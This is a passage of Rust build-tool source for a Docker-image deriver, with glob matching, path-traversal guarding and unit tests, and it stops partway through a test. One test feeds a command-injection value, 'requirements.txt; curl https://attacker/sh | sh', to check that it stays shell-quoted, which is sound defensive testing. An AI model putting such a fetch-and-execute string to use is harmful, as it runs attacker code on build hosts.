    hash_path_tree(&src, &src, &mut hasher)?;

    // Fold in each `include` glob match too, keyed by its staged layout, so
    // editing an included asset rebuilds the image. resolve_includes returns the
    // resolve_includes returns the same entries copy_tree stages, in the same
    // sorted order, so the digest tracks exactly the bytes that ship.
    let includes = resolve_includes(&src, root, &project.include)
        .with_context(|| format!("failed to resolve project includes under {}", src.display()))?;
    for include in includes {
        // Distinguish an include subtree from the main tree by its layout key.
        hasher.update(b"include\0");
        hasher.update(include.relative.to_string_lossy().as_bytes());
        hasher.update([0u8]);
        hash_path_tree(&include.path, &include.path, &mut hasher)?;
    }

    Ok(Some(hex(&hasher.finalize())))
}

/// Hash a file or directory tree deterministically. For each file in sorted
/// relative-path order, the relative path and bytes are folded in so the digest
/// mirrors Docker's COPY-layer cache key.
///
/// Symlink children are skipped for safety and consistency. Each child is
/// classified by its own `entry.file_type()`, which reports the link itself
/// without dereferencing or erroring on a dangling/looping target. A symlink
/// child is dropped before it is sorted, hashed, or recursed into. `copy_tree`
/// in docker.rs makes the same skip decision, so the hashed bytes match the
/// bytes staged into the image. `fs::metadata` is used only to classify the
/// passed-in root; every child is filtered first, so it never runs on a link and
/// cannot abort on a cycle or a dangling target.
/// Linked/out-of-tree assets are carried explicitly via `ProjectInstall::include`
/// (a guarded, canonicalized glob), not by silently following links here.
fn hash_path_tree(root: &Path, path: &Path, hasher: &mut Sha256) -> AnyResult<()> {
    let metadata =
        fs::metadata(path).with_context(|| format!("failed to stat {}", path.display()))?;
    if metadata.is_dir() {
        let mut entries: Vec<PathBuf> = fs::read_dir(path)
            .with_context(|| format!("failed to read dir {}", path.display()))?
            // Skip symlink children identically to copy_tree: file_type() reports
            // the link itself, so a dangling/cyclic/escaping link is dropped
            // without ever dereferencing it.
            .filter_map(|entry| match entry {
                Ok(entry) => match entry.file_type() {
                    Ok(file_type) if file_type.is_symlink() => None,
                    Ok(_) => Some(Ok(entry.path())),
                    Err(err) => Some(Err(err)),
                },
                Err(err) => Some(Err(err)),
            })
            .collect::<std::result::Result<_, _>>()?;
        entries.sort();
        for entry in entries {
            hash_path_tree(root, &entry, hasher)?;
        }
    } else if metadata.is_file() {
        let rel = path.strip_prefix(root).unwrap_or(path);
        hasher.update(rel.to_string_lossy().as_bytes());
        hasher.update([0u8]);
        let bytes = fs::read(path).with_context(|| format!("failed to read {}", path.display()))?;
        hasher.update((bytes.len() as u64).to_le_bytes());
        hasher.update(&bytes);
    }
    Ok(())
}

/// Recursively match `segments` against the directory `current`, collecting
/// matched paths into `out`. `pattern` is carried only for error messages and
/// `real_context` is the canonical context root the traversal guard enforces.
fn match_glob(
    current: &Path,
    segments: &[&str],
    pattern: &str,
    real_context: &Path,
    out: &mut std::collections::BTreeSet<PathBuf>,
) -> Result<(), IncludeError> {
    let [segment, rest @ ..] = segments else {
        // All segments consumed: `current` is a match. Guard it, then keep it.
        if let Some(path) = guarded(current, pattern, real_context)? {
            out.insert(path);
        }
        return Ok(());
    };

    match *segment {
        "." => match_glob(current, rest, pattern, real_context, out),
        ".." => {
            let parent = current.join("..");
            match_glob(&parent, rest, pattern, real_context, out)
        }
        "**" => {
            // `**` matches zero segments; try `rest` here first.
            match_glob(current, rest, pattern, real_context, out)?;
            // Or match one-or-more segments by descending into each child dir.
            for child in read_child_dirs(current, pattern)? {
                match_glob(&child, segments, pattern, real_context, out)?;
            }
            Ok(())
        }
        literal_or_star => {
            for entry in read_entries(current, pattern)? {
                let name = entry.file_name();
                let name = name.to_string_lossy();
                if segment_matches(literal_or_star, name.as_ref()) {
                    match_glob(&entry.path(), rest, pattern, real_context, out)?;
                }
            }
            Ok(())
        }
    }
}

/// List the immediate child entries of `dir`; a missing dir yields nothing (a
/// glob over an absent path simply matches nothing).
fn read_entries(dir: &Path, pattern: &str) -> Result<Vec<std::fs::DirEntry>, IncludeError> {
    let reader = match std::fs::read_dir(dir) {
        Ok(reader) => reader,
        Err(err) if err.kind() == std::io::ErrorKind::NotFound => return Ok(Vec::new()),
        Err(source) => {
            return Err(IncludeError::Io {
                pattern: pattern.to_string(),
                source,
            });
        }
    };
    reader
        .map(|entry| {
            entry.map_err(|source| IncludeError::Io {
                pattern: pattern.to_string(),
                source,
            })
        })
        .collect()
}

/// List the immediate child directories of `dir` for the `**` descent, skipping
/// symlinked entries.
///
/// Classification uses the `DirEntry`'s own file type, so `**` descends only
/// into real directories. A benign outward symlink (e.g. `.venv -> /shared`) is
/// not followed into `guarded()`, where it would fail as `Escapes`, and a cyclic
/// link cannot trigger a `FilesystemLoop`. A directly named literal include path
/// that is a symlink still flows through the terminal `guarded()` containment
/// check and is staged if it resolves within `context_root`; only the
/// auto-descent of `**` stops following links.
fn read_child_dirs(dir: &Path, pattern: &str) -> Result<Vec<PathBuf>, IncludeError> {
    let mut dirs = Vec::new();
    for entry in read_entries(dir, pattern)? {
        // file_type() reports the link itself, so a symlinked subdir is skipped
        // (not followed) and a dangling/cyclic link never aborts the descent.
        let is_real_dir = entry
            .file_type()
            .map(|file_type| file_type.is_dir() && !file_type.is_symlink())
            .unwrap_or(false);
        if is_real_dir {
            dirs.push(entry.path());
        }
    }
    Ok(dirs)
}

/// Whether a single literal-or-`*` glob segment matches a path-component `name`.
/// `*` matches any run of characters (within the one segment); all other
/// characters are literal.
fn segment_matches(pattern: &str, name: &str) -> bool {
    if !pattern.contains('*') {
        return pattern == name;
    }
    // Split on `*`; each literal piece must appear in order, with the first
    // anchored at the start and the last anchored at the end.
    let pieces: Vec<&str> = pattern.split('*').collect();
    let mut cursor = 0usize;
    for (index, piece) in pieces.iter().enumerate() {
        if piece.is_empty() {
            continue;
        }
        if index == 0 {
            if !name[cursor..].starts_with(piece) {
                return false;
            }
            cursor += piece.len();
        } else if index == pieces.len() - 1 {
            if !name[cursor..].ends_with(piece) {
                return false;
            }
        } else if let Some(found) = name[cursor..].find(piece) {
            cursor += found + piece.len();
        } else {
            return false;
        }
    }
    true
}

/// Enforce the path-traversal guard: canonicalize `path` and require it to live
/// within `real_context` (the build context root). Returns the *canonical*
/// matched path (so its layout relative to a root strips cleanly even through
/// `..`) or `None` if the path vanished between listing and the guard.
fn guarded(
    path: &Path,
    pattern: &str,
    real_context: &Path,
) -> Result<Option<PathBuf>, IncludeError> {
    let real = match std::fs::canonicalize(path) {
        Ok(real) => real,
        Err(err) if err.kind() == std::io::ErrorKind::NotFound => return Ok(None),
        Err(source) => {
            return Err(IncludeError::Io {
                pattern: pattern.to_string(),
                source,
            });
        }
    };
    if !real.starts_with(real_context) {
        return Err(IncludeError::Escapes {
            pattern: pattern.to_string(),
            path: real.display().to_string(),
        });
    }
    Ok(Some(real))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::DEFAULT_BASE_IMAGE;

    const GYM_RECIPE_JSON: &str = include_str!("../tests/golden/gym_atari.recipe.json");
    const GYM_GOLDEN: &str = include_str!("../tests/golden/gym_atari.dockerfile");
    const LIBERO_RECIPE_JSON: &str = include_str!("../tests/golden/libero.recipe.json");
    const LIBERO_GOLDEN: &str = include_str!("../tests/golden/libero.dockerfile");

    fn gym_recipe() -> Recipe {
        Recipe::from_json(GYM_RECIPE_JSON).expect("fixture parses")
    }

    /// A representative resolved RLMesh package for the deriver tests: a plain
    /// pip spec named `rlmesh`, so the goldens read `'rlmesh'` (the upstream
    /// resolver normally hands in `rlmesh==X` or a staged wheel path).
    fn rlmesh_pkg() -> ResolvedRlmeshPackage {
        ResolvedRlmeshPackage::Pip {
            spec: "rlmesh".to_string(),
        }
    }

    /// Derive against the default base, the representative pip package, no extra
    /// caller packages, and `Installed` provenance (so the implicit gymnasium is
    /// injected) -- the common case for most deriver tests and the goldens.
    fn derive(recipe: &Recipe) -> Result<String, DeriveError> {
        derive_dockerfile(
            recipe,
            DEFAULT_BASE_IMAGE,
            &rlmesh_pkg(),
            &[],
            RecipeProvenance::Installed,
        )
    }

    #[test]
    fn model_recipe_gets_the_model_entrypoint() {
        let recipe = Recipe::from_json(
            r#"{"name":"policy/x","kind":"model","build":{},"make":{"kind":"py","entrypoint":"m:C._rlmesh_load","kwargs":{}}}"#,
        )
        .expect("model recipe parses");
        let dockerfile = derive(&recipe).expect("derives");
        assert!(
            dockerfile.contains("rlmesh._bootstrap.sandbox_model"),
            "a model recipe should use the model bootstrap, got:\n{dockerfile}"
        );
        assert!(!dockerfile.contains("sandbox_env"));
    }

    #[test]
    fn deserializes_python_wire_shape() {
        let recipe = gym_recipe();
        assert_eq!(recipe.name, "atari/breakout");
        assert_eq!(
            recipe.make,
            Some(Make::Gym {
                env_id: "ALE/Breakout-v5".to_string(),
                kwargs: BTreeMap::new(),
            })
        );
        assert_eq!(recipe.build.pip.len(), 1);
        assert_eq!(recipe.build.pip[0].packages, ["ale-py"]);
        assert_eq!(recipe.requires.imports, ["ale_py"]);
        assert_eq!(recipe.recipe_version, 1);
    }

    #[test]
    fn gym_recipe_matches_golden_dockerfile() {
        let derived = derive(&gym_recipe()).expect("derives");
        assert_eq!(
            derived, GYM_GOLDEN,
            "derived Dockerfile drifted from the checked-in golden"
        );
    }

    #[test]
    fn empty_build_uses_default_base() {
        let recipe = Recipe::from_json(r#"{"name":"a","make":{"kind":"gym","env_id":"E-v0"}}"#)
            .expect("parses");
        let derived = derive(&recipe).expect("derives");
        assert!(derived.contains(&format!("FROM {DEFAULT_BASE_IMAGE}")));
    }

    #[test]
    fn renders_apt_union_dedup_order() {
        let recipe = Recipe::from_json(
            r#"{"name":"a","build":{"system":["cmake","g++"],"system_runtime":["g++","libglew2.2"]}}"#,
        )
        .expect("parses");
        let derived = derive(&recipe).expect("derives");
        assert!(derived.contains(
            "RUN apt-get update && apt-get install -y --no-install-recommends 'cmake' 'g++' 'libglew2.2' && rm -rf /var/lib/apt/lists/*"
        ));
    }

    #[test]
    fn renders_indexed_and_no_deps_pip() {
        let recipe = Recipe::from_json(
            r#"{"name":"a","build":{"pip":[
                {"packages":["torch"],"index_url":"https://download.pytorch.org/whl/cu124"},
                {"packages":["numpy==1.26.4"],"no_deps":true}
            ]}}"#,
        )
        .expect("parses");
        let derived = derive(&recipe).expect("derives");
        assert!(derived.contains(
            "python -m pip install --no-cache-dir --index-url 'https://download.pytorch.org/whl/cu124' 'torch'"
        ));
        assert!(derived.contains("python -m pip install --no-cache-dir --no-deps 'numpy==1.26.4'"));
    }

    #[test]
    fn renders_gpu_env_and_pythonpath() {
        let recipe = Recipe::from_json(
            r#"{"name":"a","build":{"gpu":true,"env":{"MUJOCO_GL":"egl"},"pythonpath":["/opt/x","/opt/y"]}}"#,
        )
        .expect("parses");
        let derived = derive(&recipe).expect("derives");
        assert!(derived.contains("ENV NVIDIA_DRIVER_CAPABILITIES=all"));
        assert!(derived.contains("ENV MUJOCO_GL=egl"));
        assert!(derived.contains("ENV PYTHONPATH=/opt/x:/opt/y"));
    }

    #[test]
    fn renders_run_as_user_and_commands() {
        let recipe =
            Recipe::from_json(r#"{"name":"a","build":{"run_as":1000,"commands":["echo built"]}}"#)
                .expect("parses");
        let derived = derive(&recipe).expect("derives");
        assert!(derived.contains("RUN sh -lc 'echo built'"));
        assert!(derived.contains("USER 1000"));
        assert!(derived.contains("useradd --create-home --uid 1000 rlmesh"));
    }

    #[test]
    fn dockerfile_trapdoor_emits_verbatim_with_baked_recipe_and_entrypoint() {
        let recipe = Recipe::from_json(
            r#"{"name":"a","build":{"dockerfile":"FROM scratch\nRUN echo hi\n"}}"#,
        )
        .expect("parses");
        let derived = derive(&recipe).expect("derives");
        // The verbatim trapdoor must still bake recipe.json + RLMESH_RECIPE_PATH so
        // the exported image is self-describing on the no-inline-payload run path,
        // exactly like the structured deriver.
        assert_eq!(
            derived,
            "FROM scratch\nRUN echo hi\n\nCOPY recipe.json /opt/rlmesh/recipe.json\nENV RLMESH_RECIPE_PATH=/opt/rlmesh/recipe.json\n\nENTRYPOINT [\"python\", \"-m\", \"rlmesh._bootstrap.sandbox_env\"]\n"
        );
    }

    #[test]
    fn renders_project_copy_and_editable_install() {
        let recipe = Recipe::from_json(
            r#"{"name":"a","build":{"project":{"src":".","dest":"/opt/robot_env"}}}"#,
        )
        .expect("parses");
        let derived = derive(&recipe).expect("derives");
        assert!(derived.contains("COPY project /opt/robot_env"));
        assert!(derived.contains("RUN python -m pip install --no-cache-dir -e '/opt/robot_env'"));
    }

    #[test]
    fn renders_project_default_dest_and_non_editable() {
        let recipe = Recipe::from_json(r#"{"name":"a","build":{"project":{"editable":false}}}"#)
            .expect("parses");
        let derived = derive(&recipe).expect("derives");
        assert!(derived.contains("COPY project /opt/rlmesh/project"));
        assert!(derived.contains("RUN python -m pip install --no-cache-dir '/opt/rlmesh/project'"));
        assert!(!derived.contains(" -e '/opt/rlmesh/project'"));
    }

    #[test]
    fn renders_git_fetch_pinned_with_install() {
        let recipe = Recipe::from_json(
            r#"{"name":"a","build":{"fetch":[{"kind":"git","repo":"https://github.com/x/LIBERO.git","ref":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","dest":"/opt/LIBERO","pip_install":true}]}}"#,
        )
        .expect("parses");
        let derived = derive(&recipe).expect("derives");
        // A pinned ref fetches into a fresh repo (no default-branch clone first)
        // and checks out FETCH_HEAD.
        assert!(derived.contains(
            "RUN git init '/opt/LIBERO' && git -C '/opt/LIBERO' remote add origin 'https://github.com/x/LIBERO.git' && git -C '/opt/LIBERO' fetch --depth=1 origin 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' && git -C '/opt/LIBERO' checkout FETCH_HEAD && python -m pip install --no-cache-dir -e '/opt/LIBERO' && rm -rf '/opt/LIBERO'/.git"
        ));
    }

    #[test]
    fn renders_git_fetch_without_ref_uses_plain_clone() {
        // With no ref pinned, fall back to a shallow clone of the default branch.
        let recipe = Recipe::from_json(
            r#"{"name":"a","build":{"fetch":[{"kind":"git","repo":"https://github.com/x/R.git","dest":"/opt/R","pip_install":true}]}}"#,
        )
        .expect("parses");
        let derived = derive(&recipe).expect("derives");
        assert!(derived.contains(
            "RUN git clone --depth=1 'https://github.com/x/R.git' '/opt/R' && python -m pip install --no-cache-dir -e '/opt/R' && rm -rf '/opt/R'/.git"
        ));
        assert!(!derived.contains("git init"));
    }

    #[test]
    fn render_fetch_pip_requirements_is_shell_quoted() {
        // `pip_requirements` is author-supplied and validate_token only rejects
        // control chars, so the whole `dest/req` path must be one quoted shell
        // arg -- otherwise shell metacharacters in `req` inject a command that
        // runs during `docker build` (bypassing the no-build.commands gate).
        let recipe = Recipe::from_json(
            r#"{"name":"a","build":{"fetch":[{"kind":"git","repo":"https://x/r.git","dest":"/opt/r","pip_requirements":"requirements.txt; curl https://attacker/sh | sh"}]}}"#,
        )
        .expect("parses");
        let derived = derive(&recipe).expect("derives");
        // The path is emitted as a single quoted argument. The injected metachars
        // stay inside the quotes, so no bare `; ` / `| ` survives.
        assert!(derived.contains(" -r '/opt/r/requirements.txt; curl https://attacker/sh | sh'"));
        // The old unquoted form (dest_q then a bare /req) must not appear; that
        // left the metacharacters outside the quotes as live shell syntax.
        assert!(!derived.contains(" -r '/opt/r'/requirements.txt"));
        // The injected shell fragment lives only inside the single-quoted
        // path argument, so the shell never parses it as a command separator.
        // This fetch is unpinned (no ref), so the chain uses `git clone`.
        let run_line = derived
            .lines()
            .find(|line| line.contains("git clone"))
            .expect("git fetch RUN line");
        assert!(run_line.contains(" -r '/opt/r/requirements.txt; curl https://attacker/sh | sh'"));
    }

    #[test]
    fn derive_dockerfile_installs_git_for_a_git_fetch() {
        // A git fetch needs `git` on PATH before its RUN; the deriver must add it
        // to the apt step even when the author listed no system packages.
        let recipe = Recipe::from_json(
            r#"{"name":"a","build":{"fetch":[{"kind":"git","repo":"https://x/r.git","dest":"/opt/r"}]}}"#,
        )
        .expect("parses");
        let derived = derive(&recipe).expect("derives");
        // An apt step is emitted with git even though system/system_runtime were
        // empty, and it precedes the git clone RUN.
        let apt = derived
            .find("apt-get install")
            .expect("apt step is emitted for a fetch tool");
        let clone = derived.find("git clone").expect("git fetch RUN");
        assert!(apt < clone, "git must be installed before the clone RUN");
        assert!(derived.contains("--no-install-recommends 'git' && rm -rf"));
    }

    #[test]
    fn derive_dockerfile_installs_curl_for_a_url_fetch() {
        let recipe = Recipe::from_json(
            r#"{"name":"a","build":{"fetch":[{"kind":"url","url":"https://x/a.tar.gz","dest":"/opt/a.tar.gz"}]}}"#,
        )
        .expect("parses");
        let derived = derive(&recipe).expect("derives");
        assert!(derived.contains("--no-install-recommends 'curl' && rm -rf"));
        let apt = derived
            .find("apt-get install")
            .expect("apt step is emitted for a fetch tool");
        let curl = derived.find("curl -fsSL").expect("url fetch RUN");
        assert!(apt < curl, "curl must be installed before the download RUN");
    }

    #[test]
    fn derive_dockerfile_does_not_duplicate_an_already_listed_tool() {
        // The author already lists git; the deriver must not add a second 'git'.
        let recipe = Recipe::from_json(
            r#"{"name":"a","build":{"system":["git","cmake"],"fetch":[{"kind":"git","repo":"https://x/r.git","dest":"/opt/r"}]}}"#,
        )
        .expect("parses");
        let derived = derive(&recipe).expect("derives");
        assert!(derived.contains(
            "RUN apt-get update && apt-get install -y --no-install-recommends 'git' 'cmake' && rm -rf /var/lib/apt/lists/*"
        ));
        assert_eq!(derived.matches("'git'").count(), 1, "git must appear once");
    }

    #[test]
    fn renders_url_fetch_with_sha256_check() {
        let recipe = Recipe::from_json(
            r#"{"name":"a","build":{"fetch":[{"kind":"url","url":"https://x/a.tar.gz","dest":"/opt/a.tar.gz","sha256":"0000000000000000000000000000000000000000000000000000000000000000"}]}}"#,
        )
        .expect("parses");
        let derived = derive(&recipe).expect("derives");
        assert!(derived.contains(
            "RUN curl -fsSL 'https://x/a.tar.gz' -o '/opt/a.tar.gz' && echo '0000000000000000000000000000000000000000000000000000000000000000  /opt/a.tar.gz' | sha256sum -c -"
        ));
    }

    #[test]
    fn fetch_missing_dest_is_a_missing_field_error() {
        let recipe = Recipe::from_json(
            r#"{"name":"a","build":{"fetch":[{"kind":"git","repo":"https://x/r.git"}]}}"#,
        )
        .expect("parses");
        assert!(matches!(derive(&recipe), Err(DeriveError::MissingField(_))));
    }

    #[test]
    fn renders_uv_installer_path() {
        let recipe = Recipe::from_json(
            r#"{"name":"a","build":{"installer":"uv","pip":[{"packages":["sapien"]}]}}"#,
        )
        .expect("parses");
        let derived = derive(&recipe).expect("derives");
        assert!(derived.contains("python -m pip install --no-cache-dir uv"));
        assert!(derived.contains("uv pip install --system --no-cache-dir 'rlmesh'"));
        assert!(derived.contains("uv pip install --system --no-cache-dir 'sapien'"));
    }

    #[test]
    fn uv_is_bootstrapped_before_a_project_uv_install() {
        // installer="uv" + a project: render_project emits a uv editable install,
        // but uv is bootstrapped (`python -m pip install uv`) in render_pip_chain
        // which runs AFTER the project -- so without an early bootstrap the build
        // hits `uv: not found`. The early bootstrap must precede the first project
        // `uv pip install`.
        let recipe = Recipe::from_json(
            r#"{"name":"a","build":{"installer":"uv","project":{"src":".","dest":"/opt/p"}}}"#,
        )
        .expect("parses");
        let derived = derive(&recipe).expect("derives");
        let bootstrap = derived
            .find("RUN python -m pip install --no-cache-dir uv")
            .expect("early uv bootstrap RUN");
        let project_install = derived
            .find("RUN uv pip install --system --no-cache-dir -e '/opt/p'")
            .expect("project uv install");
        assert!(
            bootstrap < project_install,
            "uv must be bootstrapped before the project `uv pip install`"
        );
    }

    #[test]
    fn uv_is_bootstrapped_before_a_fetch_uv_install() {
        // Same hazard via a pip-installing fetch: its `uv pip install -e <dest>`
        // runs before render_pip_chain, so the early bootstrap must precede it.
        let recipe = Recipe::from_json(
            r#"{"name":"a","build":{"installer":"uv","fetch":[{"kind":"git","repo":"https://x/r.git","dest":"/opt/r","pip_install":true}]}}"#,
        )
        .expect("parses");
        let derived = derive(&recipe).expect("derives");
        let bootstrap = derived
            .find("RUN python -m pip install --no-cache-dir uv")
            .expect("early uv bootstrap RUN");
        let fetch_install = derived
            .find("uv pip install --system --no-cache-dir -e '/opt/r'")
            .expect("fetch uv install");
        assert!(
            bootstrap < fetch_install,
            "uv must be bootstrapped before the fetch `uv pip install`"
        );
    }

    #[test]
    fn remote_provenance_skips_implicit_unpinned_gymnasium() {
        // A Remote recipe is forced fully-pinned by the upstream reproducibility
        // gate, so the deriver must not inject an implicit unpinned gymnasium
        // (that would resolve a mutable PyPI package, bypassing the gate). An
        // Installed recipe still gets it as a convenience.
        let recipe = Recipe::from_json(r#"{"name":"a"}"#).expect("parses");
        let remote = derive_dockerfile(
            &recipe,
            DEFAULT_BASE_IMAGE,
            &rlmesh_pkg(),
            &[],
            RecipeProvenance::Remote,
        )
        .expect("derives");
        assert!(
            !remote.contains("gymnasium"),
            "Remote provenance must not inject an unpinned gymnasium"
        );
        // The host-controlled rlmesh install still happens regardless of provenance.
        assert!(remote.contains("python -m pip install --no-cache-dir 'rlmesh'"));

        let installed = derive_dockerfile(
            &recipe,
            DEFAULT_BASE_IMAGE,
            &rlmesh_pkg(),
            &[],
            RecipeProvenance::Installed,
        )
        .expect("derives");
        assert!(
            installed.contains("python -m pip install --no-cache-dir gymnasium"),
            "Installed provenance still injects the convenience gymnasium"
        );
    }

    #[test]
    fn non_python_base_detects_python_at_build_time() {
        // The base now arrives already-resolved as an argument (folding in the
        // build.base-wins precedence upstream), so pass the cuda base directly.
        // A bare CUDA base has no interpreter, but we no longer install python3
        // unconditionally (that would clobber a pytorch/isaac image's own python):
        // both the install and the symlink are guarded by a build-time
        // `command -v` so they no-op on an image that already has python.
        let recipe = Recipe::from_json(r#"{"name":"a"}"#).expect("parses");
        let derived = derive_dockerfile(
            &recipe,
            "nvidia/cuda:12.4.1-runtime-ubuntu22.04",
            &rlmesh_pkg(),
            &[],
            RecipeProvenance::Installed,
        )
        .expect("derives");
        // Both steps are conditional: they install/symlink only when python is
        // absent, so a python-capable image is left untouched.
        assert!(derived.contains(
            "RUN command -v python3 >/dev/null 2>&1 || (apt-get update && apt-get install -y --no-install-recommends python3 python3-pip && rm -rf /var/lib/apt/lists/*)"
        ));
        assert!(derived.contains(
            "RUN command -v python >/dev/null 2>&1 || ln -sf \"$(command -v python3)\" /usr/local/bin/python"
        ));
        // python3 / python3-pip must not be force-added to the unconditional apt
        // install line (that is the clobbering behavior we removed); they appear
        // only inside the guarded `command -v python3 ||` RUN.
        if let Some(apt_line) = derived
            .lines()
            .find(|line| line.starts_with("RUN apt-get update && apt-get install"))
        {
            assert!(
                !apt_line.contains("python3"),
                "python3 must not be in the unconditional apt install line: {apt_line}"
            );
        }
        // The detect/symlink must precede the pip layer so `python -m pip` resolves.
        let detect = derived.find("command -v python3").expect("python detect");
        let pip = derived.find("-m pip install").expect("pip layer");
        assert!(detect < pip, "python detect must precede the pip layer");

        // The default python base must not get either conditional RUN.
        let py = Recipe::from_json(r#"{"name":"a","make":{"kind":"gym","env_id":"E-v0"}}"#)
            .expect("parses");
        let py_derived = derive(&py).expect("derives");
        assert!(!py_derived.contains("command -v python3"));
        assert!(!py_derived.contains("ln -sf"));
    }

    #[test]
    fn pytorch_base_self_detects_python_instead_of_clobbering() {
        // `nvcr.io/nvidia/pytorch:24.01-py3` ships its own python, but its name
        // contains no literal "python" ('pytorch' is not 'python'), so the deriver
        // cannot tell from the tag. It must emit the conditional detect form, which
        // no-ops on the preinstalled interpreter, not an unconditional apt install
        // that would clobber the image's python and hide its packages.
        let recipe = Recipe::from_json(r#"{"name":"a"}"#).expect("parses");
        let derived = derive_dockerfile(
            &recipe,
            "nvcr.io/nvidia/pytorch:24.01-py3",
            &rlmesh_pkg(),
            &[],
            RecipeProvenance::Installed,
        )
        .expect("derives");
        // The guarded detect/symlink is emitted; it no-ops when python is present.
        assert!(derived.contains(
            "RUN command -v python3 >/dev/null 2>&1 || (apt-get update && apt-get install -y --no-install-recommends python3 python3-pip && rm -rf /var/lib/apt/lists/*)"
        ));
        assert!(derived.contains(
            "RUN command -v python >/dev/null 2>&1 || ln -sf \"$(command -v python3)\" /usr/local/bin/python"
        ));
        // There is no unconditional apt install of python3 that would
        // clobber the image's interpreter.
        assert!(
            !derived.lines().any(
                |line| line.starts_with("RUN apt-get update && apt-get install")
                    && line.contains("python3")
            ),
            "pytorch base must self-detect, not unconditionally install python3"
        );
    }

    #[test]
    fn libero_recipe_matches_golden_dockerfile() {
        let recipe = Recipe::from_json(LIBERO_RECIPE_JSON).expect("fixture parses");
        let derived = derive(&recipe).expect("derives");
        assert_eq!(
            derived, LIBERO_GOLDEN,
            "derived LIBERO Dockerfile drifted from the checked-in golden"
        );
    }

    #[test]
    fn round_trips_through_serde() {
        let recipe = gym_recipe();
        let json = serde_json::to_string(&recipe).expect("serializes");
        let back = Recipe::from_json(&json).expect("parses");
        assert_eq!(recipe, back);
    }

    #[test]
    fn installs_resolved_pip_rlmesh_ref_not_hardcoded_rlmesh() {
        // The resolved pip spec (e.g. a pinned version) must be what gets
        // installed, so the Dockerfile agrees with the build hash.
        let recipe = Recipe::from_json(r#"{"name":"a"}"#).expect("parses");
        let pkg = ResolvedRlmeshPackage::Pip {
            spec: "rlmesh==0.1.0b2".to_string(),
        };
        let derived = derive_dockerfile(
            &recipe,
            DEFAULT_BASE_IMAGE,
            &pkg,
            &[],
            RecipeProvenance::Installed,
        )
        .expect("derives");
        assert!(derived.contains("python -m pip install --no-cache-dir 'rlmesh==0.1.0b2'"));
    }

    #[test]
    fn copies_and_installs_staged_local_rlmesh_wheel() {
        // A local wheel rlmesh package stages a packages/ dir into the context,
        // so the deriver must COPY it and install from the wheel's install path.
        let recipe = Recipe::from_json(r#"{"name":"a"}"#).expect("parses");
        let pkg = ResolvedRlmeshPackage::Wheel {
            source_path: "/tmp/rlmesh-0.1.0b2-cp311-abi3-manylinux_x86_64.whl".into(),
            install_path: "/opt/rlmesh/packages/rlmesh-0.1.0b2-cp311-abi3-manylinux_x86_64.whl"
                .to_string(),
            sha256: "abc".to_string(),
        };
        let derived = derive_dockerfile(
            &recipe,
            DEFAULT_BASE_IMAGE,
            &pkg,
            &[],
            RecipeProvenance::Installed,
        )
        .expect("derives");
        assert!(derived.contains("COPY packages /opt/rlmesh/packages"));
        assert!(derived.contains(
            "python -m pip install --no-cache-dir '/opt/rlmesh/packages/rlmesh-0.1.0b2-cp311-abi3-manylinux_x86_64.whl'"
        ));
    }

    #[test]
    fn appends_caller_extra_packages_to_pip_chain() {
        // The SandboxEnv packages argument must reach the pip chain.
        let recipe = Recipe::from_json(r#"{"name":"a"}"#).expect("parses");
        let packages = vec!["pygame".to_string(), "numpy==1.26.4".to_string()];
        let derived = derive_dockerfile(
            &recipe,
            DEFAULT_BASE_IMAGE,
            &rlmesh_pkg(),
            &packages,
            RecipeProvenance::Installed,
        )
        .expect("derives");
        assert!(derived.contains("python -m pip install --no-cache-dir 'pygame' 'numpy==1.26.4'"));
    }

    fn write(path: &Path, contents: &[u8]) {
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent).unwrap();
        }
        std::fs::write(path, contents).unwrap();
    }

    #[test]
    fn resolve_includes_matches_double_star_glob() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        write(&root.join("assets/sub/a.png"), b"a");
        write(&root.join("assets/b.png"), b"b");
        write(&root.join("code.py"), b"code");

        // src == "." so project_root == context_root.
        let matches = resolve_includes(root, root, &["assets/**".to_string()]).unwrap();
        // `assets/**` collapses to the single `assets` dir (descendants pruned),
        // so its whole subtree stages once; `code.py` is not matched.
        let relatives: Vec<_> = matches.iter().map(|m| m.relative.clone()).collect();
        assert_eq!(relatives, vec![PathBuf::from("assets")]);
    }

    #[test]
    fn resolve_includes_matches_star_within_a_segment() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        write(&root.join("a.json"), b"1");
        write(&root.join("b.json"), b"2");
        write(&root.join("c.txt"), b"3");

        let matches = resolve_includes(root, root, &["*.json".to_string()]).unwrap();
        let relatives: Vec<_> = matches.iter().map(|m| m.relative.clone()).collect();
        assert_eq!(
            relatives,
            vec![PathBuf::from("a.json"), PathBuf::from("b.json")]
        );
    }

    #[test]
    fn resolve_includes_reaches_a_sibling_above_src() {
        // src is a subdir; `../assets/**` reaches a sibling above src but within
        // context_root, and is staged relative to context_root so it lands
        // inside the project dir (not climbing out via `..`).
        let dir = tempfile::tempdir().unwrap();
        let context_root = dir.path();
        write(&context_root.join("assets/scene.json"), b"a");
        std::fs::create_dir_all(context_root.join("pkg")).unwrap();
        let project_root = context_root.join("pkg");

        let matches =
            resolve_includes(&project_root, context_root, &["../assets/**".to_string()]).unwrap();
        let relatives: Vec<_> = matches.iter().map(|m| m.relative.clone()).collect();
        assert_eq!(relatives, vec![PathBuf::from("assets")]);
    }

    #[test]
    fn resolve_includes_rejects_a_path_escaping_the_context_root() {
        // A symlink pointing outside the context root must be rejected by the
        // traversal guard rather than silently staging foreign content.
        let outer = tempfile::tempdir().unwrap();
        write(&outer.path().join("secret.txt"), b"secret");
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        std::fs::create_dir_all(root).unwrap();
        #[cfg(unix)]
        {
            std::os::unix::fs::symlink(outer.path().join("secret.txt"), root.join("link.txt"))
                .unwrap();
            let err = resolve_includes(root, root, &["link.txt".to_string()]).unwrap_err();
            assert!(matches!(err, IncludeError::Escapes { .. }));
        }
    }

    #[test]
    fn resolve_includes_absent_pattern_matches_nothing() {
        let dir = tempfile::tempdir().unwrap();
        let matches = resolve_includes(dir.path(), dir.path(), &["nope/**".to_string()]).unwrap();
        assert!(matches.is_empty());
    }

    #[cfg(unix)]
    #[test]
    fn double_star_descent_skips_symlinked_subdirs_without_aborting() {
        // `**` descent must SKIP symlinked subdirs rather than follow them: a
